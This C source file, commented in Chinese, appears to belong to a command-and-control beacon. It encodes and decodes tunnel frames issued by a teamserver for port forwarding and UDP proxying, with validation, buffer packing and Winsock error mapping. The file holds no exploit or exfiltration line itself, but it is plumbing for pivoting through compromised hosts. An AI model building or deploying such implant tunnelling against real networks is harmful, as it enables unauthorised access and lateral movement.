/*
 * tunnel_frame.c - 隧道帧编解码、字符串工具、错误码映射
 *
 * 负责把 teamserver 下发的请求结构解析成内存表示，反之把响应打包成
 * 可下发的 ByteBuf。无状态、纯函数为主，便于审查。
 */
#include "beacon_tunnel_internal.h"

/* 返回空数据包列表（无条目） */
PacketList TunnelEmptyList(VOID)
{
    PacketList out;
    PlistInit(&out);
    return out;
}

/* 返回包含单个文本结果的数据包列表 */
PacketList TunnelTextResult(const CHAR* text)
{
    PacketList out;
    PlistInit(&out);
    PlistAdd(&out, BbFromText(text ? text : ""));
    return out;
}

/* 原地去除前导和尾部空白字符 */
static VOID TunnelTrimInPlace(CHAR* s)
{
    CHAR* start;
    SIZE_T len;

    if (!s) {
        return;
    }

    /* 跳过前导空白字符 */
    start = s;
    while (*start && isspace((BYTE)*start)) {
        ++start;
    }
    if (start != s) {
        memmove(s, start, strlen(start) + 1);
    }

    /* 去除尾部空白字符 */
    len = strlen(s);
    while (len > 0 && isspace((BYTE)s[len - 1])) {
        s[--len] = 0;
    }
}

/* 原地将字符串转换为小写 */
static VOID TunnelLowerInPlace(CHAR* s)
{
    while (s && *s) {
        *s = (CHAR)tolower((BYTE)*s);
        ++s;
    }
}

/* 释放 TunnelStartRequest 中所有堆分配的字段 */
VOID TunnelFreeStart(TunnelStartRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->mode);
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    HeapFree(GetProcessHeap(), 0, req->proto);
    HeapFree(GetProcessHeap(), 0, req->target);
    memset(req, 0, sizeof(*req));
}

/* 释放 TunnelControlRequest 中所有堆分配的字段 */
VOID TunnelFreeControl(TunnelControlRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    HeapFree(GetProcessHeap(), 0, req->action);
    HeapFree(GetProcessHeap(), 0, req->reason);
    memset(req, 0, sizeof(*req));
}

/* 释放 TunnelDataRequest 中所有堆分配的字段 */
VOID TunnelFreeData(TunnelDataRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    BbFree(&req->data);
    memset(req, 0, sizeof(*req));
}

/* 规范化并验证隧道启动请求；填充默认值 */
INT TunnelNormalizeStart(TunnelStartRequest* req, CHAR* error, SIZE_T error_len)
{
    TunnelTrimInPlace(req->mode);
    TunnelTrimInPlace(req->tunnel_id);
    TunnelTrimInPlace(req->channel_id);
    TunnelTrimInPlace(req->proto);
    TunnelTrimInPlace(req->target);
    TunnelLowerInPlace(req->mode);
    TunnelLowerInPlace(req->proto);

    /* 默认模式 */
    if (!req->mode || req->mode[0] == 0) {
        HeapFree(GetProcessHeap(), 0, req->mode);
        req->mode = HeapStrDupA("port_forward");
    }

    /* 必需字段 */
    if (!req->tunnel_id || req->tunnel_id[0] == 0) {
        snprintf(error, error_len, "tunnel_id is required");
        return 0;
    }
    if (!req->channel_id || req->channel_id[0] == 0) {
        snprintf(error, error_len, "channel_id is required");
        return 0;
    }

    /* 基于模式的默认协议 */
    if (!req->proto || req->proto[0] == 0) {
        HeapFree(GetProcessHeap(), 0, req->proto);
        req->proto = HeapStrDupA(req->mode && strcmp(req->mode, "udp_proxy") == 0 ? "udp" : "tcp");
    }
    if (!req->proto || (strcmp(req->proto, "tcp") != 0 && strcmp(req->proto, "udp") != 0)) {
        snprintf(error, error_len, "unsupported tunnel proto: %s", req->proto ? req->proto : "");
        return 0;
    }

    /* 必需的目标 */
    if (!req->target || req->target[0] == 0) {
        snprintf(error, error_len, "target_address is required");
        return 0;
    }

    /* 默认连接超时 */
    if (req->connect_timeout_ms <= 0) {
        req->connect_timeout_ms = 10000;
    }
    return 1;
}

/* 规范化并验证隧道控制请求 */
INT TunnelNormalizeControl(TunnelControlRequest* req, CHAR* error, SIZE_T error_len)
{
    TunnelTrimInPlace(req->tunnel_id);
    TunnelTrimInPlace(req->channel_id);
    TunnelTrimInPlace(req->action);
    TunnelTrimInPlace(req->reason);
    TunnelLowerInPlace(req->action);

    if (!req->tunnel_id || req->tunnel_id[0] == 0) {
        snprintf(error, error_len, "tunnel_id is required");
        return 0;
    }
    return 1;
}

/* 从二进制解析器解析隧道启动请求 */
INT TunnelParseStart(Parser* parser, TunnelStartRequest* req, CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    req->mode = ParserString(parser);
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->proto = ParserString(parser);
    req->target = ParserString(parser);
    req->connect_timeout_ms = (INT)ParserU32(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeStart(req);
        return 0;
    }

    /* 规范化并验证 */
    if (!TunnelNormalizeStart(req, error, error_len)) {
        TunnelFreeStart(req);
        return 0;
    }
    return 1;
}

/* 解析隧道控制请求，可选覆盖操作 */
INT TunnelParseControl(Parser* parser, TunnelControlRequest* req, const CHAR* action_override,
                       CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->action = ParserString(parser);
    /* reason 是协议保留字段；当前只解析和释放，不参与控制逻辑。 */
    req->reason = ParserString(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeControl(req);
        return 0;
    }

    /* 若提供则应用操作覆盖 */
    if (action_override && action_override[0]) {
        HeapFree(GetProcessHeap(), 0, req->action);
        req->action = HeapStrDupA(action_override);
    }

    /* 规范化并验证 */
    if (!TunnelNormalizeControl(req, error, error_len)) {
        TunnelFreeControl(req);
        return 0;
    }
    return 1;
}

/* 从二进制解析器解析隧道数据请求 */
INT TunnelParseData(Parser* parser, TunnelDataRequest* req, CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    BbInit(&req->data);
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->data = ParserBytes(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeData(req);
        return 0;
    }
    return 1;
}

/* 将隧道启动请求打包为 ByteBuf */
ByteBuf TunnelPackStart(const TunnelStartRequest* req)
{
    ByteBuf payload;
    BbInit(&payload);
    PacketArrayString(&payload, req->mode);
    PacketArrayString(&payload, req->tunnel_id);
    PacketArrayString(&payload, req->channel_id);
    PacketArrayString(&payload, req->proto);
    PacketArrayString(&payload, req->target);
    PacketArrayI32(&payload, (INT32)req->connect_timeout_ms);
    return payload;
}

/* 将隧道控制消息打包为 ByteBuf */
ByteBuf TunnelPackControl(const CHAR* tunnel_id, const CHAR* channel_id, const CHAR* action, INT reason)
{
    ByteBuf payload;
    CHAR reason_text[32] = "";
    BbInit(&payload);

    /* 从代码构建原因文本 */
    if (reason != TUNNEL_REASON_NONE) {
        snprintf(reason_text, sizeof(reason_text), "error_%d", reason);
    }
    PacketArrayString(&payload, tunnel_id ? tunnel_id : "");
    PacketArrayString(&payload, channel_id ? channel_id : "");
    PacketArrayString(&payload, action ? action : "");
    PacketArrayString(&payload, reason_text);
    return payload;
}

/* 将隧道数据载荷打包为 ByteBuf */
ByteBuf TunnelPackData(const CHAR* tunnel_id, const CHAR* channel_id, const BYTE8* data, SIZE_T len)
{
    ByteBuf payload;
    ByteBuf packed;
    BbInit(&payload);
    PacketArrayString(&payload, tunnel_id ? tunnel_id : "");
    PacketArrayString(&payload, channel_id ? channel_id : "");
    packed = PacketPackBytesData(data, len);
    PacketArrayBytes(&payload, packed.data, packed.len);
    BbFree(&packed);
    return payload;
}

/* 将 Winsock 错误码映射为隧道原因码 */
INT TunnelWsaReason(INT err)
{
    switch (err) {
    case WSAETIMEDOUT: return TUNNEL_REASON_TIMEOUT;
    case WSAECONNREFUSED: return TUNNEL_REASON_CONNECTION_REFUSED;
    case WSAENETUNREACH:
    case WSAEHOSTUNREACH: return TUNNEL_REASON_NETWORK_UNREACHABLE;
    case WSAECONNRESET: return TUNNEL_REASON_CONNECTION_RESET;
    case WSAECONNABORTED: return TUNNEL_REASON_CONNECTION_ABORTED;
#ifdef WSAEPIPE
    case WSAEPIPE: return TUNNEL_REASON_BROKEN_PIPE;
#endif
    case WSAHOST_NOT_FOUND:
    case WSANO_DATA:
    case WSANO_RECOVERY:
    case WSATRY_AGAIN: return TUNNEL_REASON_DNS_FAILED;
    default: return TUNNEL_REASON_UNKNOWN;
    }
}
